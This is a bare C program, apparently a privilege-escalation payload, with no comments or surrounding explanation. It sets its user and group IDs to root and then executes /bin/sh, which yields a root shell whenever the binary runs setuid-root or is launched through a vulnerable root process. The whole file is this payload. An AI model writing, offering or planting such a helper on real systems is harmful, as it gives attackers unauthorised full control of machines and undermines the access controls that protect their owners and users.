#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void main(){
        char *name[2]={"/bin/sh",NULL};
        setuid(0);
        setgid(0);
        execve(name[0],name,NULL);
        exit(0);
}
